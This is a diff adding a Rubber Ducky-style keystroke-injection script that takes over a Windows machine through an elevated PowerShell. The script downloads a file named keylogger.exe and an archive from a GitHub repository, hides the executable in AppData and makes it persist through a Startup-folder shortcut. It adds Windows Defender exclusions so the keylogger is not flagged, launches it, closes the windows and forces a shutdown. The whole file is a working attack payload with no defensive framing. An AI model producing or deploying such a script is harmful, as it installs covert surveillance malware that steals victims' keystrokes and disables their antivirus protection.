@@ -1,0 +1,55 @@
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 900
+ENTER
+DELAY 3700
+STRING start-process PowerShell -verb runas
+DELAY 300
+ENTER
+DELAY 1000
+LEFTARROW
+DELAY 1000
+ENTER
+DELAY 3700
+STRING MODE CON: COLS=15 LINES=2
+DELAY 300
+ENTER
+DELAY 600
+STRING (New-Object Net.Webclient).DownloadFile('https://github.com/karlosedson/KLMakerz/raw/main/SystemWin32.zip',"$env:USERPROFILE\Downloads\SystemWin.zip")
+ENTER
+DELAY 600
+STRING Expand-Archive -Path "$env:USERPROFILE\Downloads\SystemWIN.zip" -DestinationPath "$env:USERPROFILE\Downloads\SystemWIN"
+ENTER
+DELAY 600
+STRING (New-Object Net.Webclient).DownloadFile('https://github.com/karlosedson/KLMakerz/raw/main/keylogger.exe',"$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\KL.exe")
+DELAY 900
+ENTER
+DELAY 3900
+STRING $WshShell = New-Object -comObject WScript.Shell;$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\KL.lnk"); $Shortcut.TargetPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\KL.exe"; $Shortcut.Save();
+ENTER
+DELAY 700
+STRING Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\KL.exe"
+DELAY 500
+ENTER
+DELAY 1000
+STRING Add-MpPreference -ExclusionPath "C:\Downloads"
+DELAY 1000
+ENTER
+STRING Set-Location "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
+DELAY 700
+ENTER
+DELAY 300 
+STRING .\KL.ink
+DELAY 200
+ENTER
+DELAY 3500
+ALT F4
+ALT F4
+DELAY 4000
+GUI r
+DELAY 3000
+STRING shutdown.exe /s /f /t 0
+DELAY 3000
+ENTER
